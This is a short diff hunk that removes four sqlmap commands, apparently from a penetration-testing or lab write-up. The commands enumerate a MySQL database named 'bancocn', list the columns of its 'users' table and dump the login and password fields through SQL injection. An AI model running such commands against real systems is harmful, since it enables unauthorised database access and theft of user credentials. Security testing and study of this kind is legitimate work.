@@ -1,4 +1,0 @@
-$ sqlmap -r header.txt --dbs --dbms=mysql  
-$ sqlmap -r header.txt --dbs --dbms=mysql -D bancocn --tables
-$ sqlmap -r header.txt --dbs --dbms=mysql -T users --columns 
-$ sqlmap -r header.txt --dbs --dbms=mysql -T users -C login,password --dump
